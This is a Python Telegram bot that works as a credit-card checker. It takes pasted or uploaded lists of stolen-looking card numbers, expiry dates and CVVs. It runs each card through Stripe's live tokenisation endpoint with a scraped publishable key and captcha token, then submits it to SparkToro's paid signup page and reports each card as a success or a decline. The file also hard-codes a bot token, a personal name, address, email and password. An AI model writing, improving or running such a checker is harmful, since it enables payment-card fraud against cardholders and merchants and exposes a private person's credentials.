import telebot
import requests
import os

TOKEN = '7018443911:AAGaG92kGhUpRUrb9f6TjI0qD8bMCk34PJ8'  # <-- Replace with your actual bot token

bot = telebot.TeleBot(TOKEN)

def parse_cc_line(line):
    line = line.replace(' ', '').replace(':', '|').replace(';', '|').replace(',', '|')
    parts = line.split('|')
    if len(parts) == 4:
        cc, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = '20' + yy
        return cc, mm, yy, cvv
    return None

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
                     "Send me CC combos in the format:\nCC|MM|YY|CVV or CC|MM|YYYY|CVV\nYou can send as text or .txt file.")

@bot.message_handler(content_types=['text'])
def cc_text_handler(message):
    lines = [l.strip() for l in message.text.split('\n') if l.strip()]
    combos = [parse_cc_line(line) for line in lines]
    combos = [c for c in combos if c]
    if not combos:
        bot.send_message(message.chat.id, "No valid CC lines found.")
        return
    bot.send_message(message.chat.id, f"Processing {len(combos)} cards...")
    for cc, mm, yy, cvv in combos:
        check_cc(message, cc, mm, yy, cvv)

@bot.message_handler(content_types=['document'])
def cc_file_handler(message):
    if not message.document.file_name.lower().endswith('.txt'):
        bot.send_message(message.chat.id, "Please send a .txt file.")
        return
    file_info = bot.get_file(message.document.file_id)
    file = bot.download_file(file_info.file_path)
    content = file.decode('utf-8', errors='ignore')
    lines = [l.strip() for l in content.split('\n') if l.strip()]
    combos = [parse_cc_line(line) for line in lines]
    combos = [c for c in combos if c]
    if not combos:
        bot.send_message(message.chat.id, "No valid CC lines found in file.")
        return
    bot.send_message(message.chat.id, f"Processing {len(combos)} cards from file...")
    for cc, mm, yy, cvv in combos:
        check_cc(message, cc, mm, yy, cvv)

def check_cc(message, cc, mm, yy, cvv):
    stripe_url = "https://api.stripe.com/v1/tokens"
    stripe_headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "origin": "https://js.stripe.com",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
        "referer": "https://js.stripe.com/",
    }
    stripe_data = {
        "guid": "31526adb-f1df-4646-9645-afdcca7497d6a65d0e",
        "muid": "0f62894b-04c0-4cf0-b359-2907f7b4c52c04c0a3",
        "sid": "654207bf-0ff1-4776-8ab9-2c4248d23bea9aa203",
        "referrer": "https://sparktoro.com",
        "time_on_page": "98646",
        "card[name]": "Peshang Salam",
        "card[address_line1]": "198 White Horse Pike",
        "card[address_city]": "West Collingswood",
        "card[address_state]": "NJ",
        "card[address_zip]": "08107",
        "card[address_country]": "USA",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiNDBuNVVFZzE4cE1iZEduakRyWVR3b3JhWU1kZTMrWHBuM1ppaGMrUnFpVzUyTm5tQjRoR3JHZGNJRkx3ZHByOHIycHNXejdwRlhPTkFZRWJQbXJGWHVtQzRnYnpQQlJhazRETDJRSW5wRThLNzFYQXpNMk5qNG1XTW1zZzhoZ1JoRGZOWFlIVkw5dlNiM1FQRFFMV3F5K1VxWW5zaVkzUHNGZVJiZ1RPS3hkWGpwSldlOWpHU1k5T2RackFuZU5ONjFOUzlwcDc2Z2RCWENoL0NyVC9lL1pyUWwwWTM0ZGRIdWFYanoyR0pWOGp2bmFQNVpjeHh4RUl4Tkx1SDBQMVppbTFGSm03Qld2bUNPYkNWQW5RZXA0eXhSaVNHOXhYUmU2Ui85MHRjbkRkTEo1WEhIUTRSUEpncG5zNFZNbjVQam5zMkJGVlR1cm4reEVLRXRzanpFQjJ0YktCd0VqSEFTWWF0YmhKdjhQamJWY1R0T1BaQUw1UjhVVk5NWUpuWFhlOVk0QlBLWFlpdThldWI2MFZTVSt5amZ3ZCt5SW5zWENaZ0ZEbm5zNU45dFVoQ2hxYTMzbjB0MFRpYzhHbStNNXM5NmRhRFE4RE1GaHh6aTMrVm5SVXZhZE8xMVRuRXdicEY1VmpZNzdTaUZnQXdRMFo4Zzc4aTRnY0lhbHZLV2U1aDJReTJianA0eGtSb09IK1EwMUxEQmhRWlErNkU0Z1RtRXo2SEVPbDlrTHRyc1ZyMDFuMkNvWmlQRkxSQVZQcE81VzNrWHlnTkNCYkIwUW1oT2FaRlc5Wmc5YkZtUk1NS0JyV1k2WUtLeFBvTTljZ0ZpVmM3eXpCakVFN1NmNU9jWUFScXcxekUyenF3ejFCeEIxb2dIZlV3U3BQVTdtVXYxTXlDMTB3a1VZZlljNktBSjY3U1Y4MitvNUpDY1VqOEpkRFArcEVuTWJkdVJlbkxGSzBqUktRVWo5WnRGcllnNmpvelN5S1lvR0gzS1dNRllnc1hpcXo0WkwwbktvaU5OUm1SMm9ZRnIwdUxzSWF2T2FFN2hXMWtMcVJkYS9ZNjJVbmNjSnh6anUwNXFUZ3h5Ynljcy9wUXdtTm14KzMrbDFlYUFTK2NDc1g0SjVLZWg2WmpJZ0NZcEY1QkkwbE5qMVFQV1VYWFVmSHpDa2FKbm5keTA4YUQ0K3BqclVDTnJVUytqV0hEV3dFVjFNMGcwTUNjTmZ1ekdTcFpGL3lscGhjdGNmcXErT3EzQ2F4RER4UVkzb0lEU01Ea3VxZVc2aWZEMmNhbnNGa05oRHlWWXl4eGdnNlNSRGhmNXFJaUdzbTh6d2xBeTFwZi9rVXBYREZJSVBxMWw3clpOMlVMVzRSV1h3c3czcmR4L3RIdEpqR1ZoblhCeDczbURURitLWG02cjhDWHdhZUNXTlhZTUxHUXhnbjZjUEJhVThxYm4rTlRnT3BuMlVKV1g3K0RQTFFpYU5BR0N0c1RPeXZVVGxoZUh6V2IvdHJXa2cvd1VEWTl2REdpeCtBdWtKelhjUStwM2lOTlpCZEJsdzRBWk1WUzZ2bmFRaGxFV1Z2S1Z5cGFZanV5ekZncmp4by9CUXhaaFZjaTRwUEZFcXBTUExiblU0cmVqNUsyaGd0YkQ3cTY0aVJ0a2NTNENucnNZNG1JMks0ZmN4d0MvUk44Wk8yWHhVc2s0UlU4N0l3ZlpPQU5QR3UxUGFQVDh3Y21ZcXBZT1RvWnl4amcrREdRaDdQY2RhOERMTWlXblhPSjNMM1krOEFiYk5yM09CMFBRSm1ZVGJmN0RCRjFiSjhaWTB5cFI5ZVM2RFpGTzdPVllnanNYV2dUcE1Ldzh4eThwV3k0WTNnME5yWEIwTG5SVG1NcUFpamdYcXBBREJvSEF1eGtvMTFCcDN2WUt4L0FsKzNPV3BLbnhrb3VUMVNTVUw4cER0RmJWbVVsNUJOUDV5TVZONVpCUlpiNHRab3Roa3VCVXcvMm9tblZweUlLQnBieVUrNmRPZmF1MEwrNHpnSkxaMHdXWTZXVmRQRlJTUXcyZGpLdG9zRUY0ZTcrbEU3UnBoaUQ4VDlwbG1yNFpNM01ON0E3SlFwc3ZXWDdtaFl1clMrRDh3Sy9LYzNiTnd6Tkk2b3NSNitBOVBhL00vdnczRDlicklvQ3MrRFVxK1RQNFhZTkZ6QXVMUm9GbjE0b3BkSGVHb1VXQTc5UlBDTW1wNklVS1NTTlhhejk4UTh5ZDdXNmhVU2dmWUtKbk40RjBOdkFVaFBJZlpETjdzZmhvWEJLVkFxL3p6SGM0NmFTMStPYmRoaWVvb0c5eDBCSUNKem00YmlweE9oM05hcTdiaXVIU25LWlFDYjhraUsrKzdWbUxaZW5uNVdkLzlmRXQ2WjF6TW02L0VOd3UvYlZ5UHRZSnpTazRMQVFOUGNacFN3T2oyQWRlSGVGVi9VQzI5YVYya2dXc0F2NEtjNEZobFpURWdiNmE4STRvRWRYNjFCZWRVcTFVQVMrYkFBc3R2MHN3a0JRa3JQMmZ4WGFPUVh5YjgramZwRFdUMkNXZjlZV3I5TlV6TkcyWm1aS2hEOHZ5d2kzRUVOa1FGcFpGWFlFTnBlbFNoWTJzVE1aVzBwaGxNNDk0cklpaUxnSThXb0xhRHUyM3lNVHNSbFZ1T3hzWjJKNnVhUHg5bDV2UlRiSEcvMC9OalRzY3NRV0tXV09rOXp1cmR6Y3NiVXIvazI3V3ZtWHlzd2VUUmpRUzVRSzFKclZ4Q3ZkUWtuZTR4ZDlrZFYxdFp5VitIell1Y0M1Sm9WOFZWZmNhVTJEcUMrdWZIVHlIa3NUSlpaYTlhbCIsImV4cCI6MTc0NjgxOTkyOSwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjQ4YjY4NWEwIiwicGQiOjAsImNkYXRhIjoibGxWbmxJZXVFK09BeHpiYlY3WTl1QThpQVhHd0h4L2Q1RjUrRGowbzg0bU1vRG05ZldXRGdXM2c4cEcrNGtHUWxxRXNrb1BuWEd2SjZrRHl2emdzN0hnUXRZaW42U3ZYMUZwM2JHTkhqM2FQVUM4TTc1VWpFTTBONHdzNEVJQTdUNk9tRmU2SlRjaytiNWRCSEVTbTROckg5YTZ2a3REUzBsNTBNKzZMMnkrc2p6VGNwYm1MMTNCenR1emhYZm5JMU16cUs4aUZvNlBJWlhPQSJ9.raQ2LuwW6GjajuKFd9E9kEOhuQ2YhPVUOTKq2FkKqbk",
        "payment_user_agent": "stripe.js/8763494800; stripe-js-v3/8763494800; split-card-element",
        "pasted_fields": "number",
        "key": "pk_live_WiKK4VbXGJzEQbtsvxxtU8iX00bKVPnB7n"
    }

    try:
        resp = requests.post(stripe_url, headers=stripe_headers, data=stripe_data, timeout=30)
        if not resp.ok:
            bot.send_message(message.chat.id, f"[{cc}|{mm}|{yy}|{cvv}] Stripe error: {resp.text}")
            return
        j = resp.json()
        if 'id' not in j:
            bot.send_message(message.chat.id, f"[{cc}|{mm}|{yy}|{cvv}] Stripe error: {resp.text}")
            return
        stripe_token = j['id']
    except Exception as e:
        bot.send_message(message.chat.id, f"[{cc}|{mm}|{yy}|{cvv}] Stripe request error: {e}")
        return

    # 2. SparkToro charge request
    sparktoro_url = "https://sparktoro.com/account/charge/personal-ehs49d"
    sparktoro_headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "origin": "https://sparktoro.com",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
        "referer": "https://sparktoro.com/account/signup/personal-ehs49d",
    }
    sparktoro_data = {
        "signup_name": "Peshang Salam",
        "signup_email": "Peshangsalam2001@gmail.com",
        "company_type": "in-house",
        "password1": "War112233$%",
        "company_type_other": "Developer",
        "name_card": "Peshang Salam",
        "country": "USA",
        "address": "198 White Horse Pike",
        "address2": "",
        "city": "West Collingswood",
        "state": "NJ",
        "zip": "08107",
        "vat": "",
        "stripeToken": stripe_token
    }

    try:
        resp2 = requests.post(sparktoro_url, headers=sparktoro_headers, data=sparktoro_data, timeout=30)
        text = resp2.text
        if "declined" in text.lower():
            msg = f"[{cc}|{mm}|{yy}|{cvv}] Decline ❌\nFull response:\n{text}"
        else:
            msg = f"[{cc}|{mm}|{yy}|{cvv}] Success ✅\nFull response:\n{text}"
        bot.send_message(message.chat.id, msg)
    except Exception as e:
        bot.send_message(message.chat.id, f"[{cc}|{mm}|{yy}|{cvv}] SparkToro request error: {e}")

bot.infinity_polling()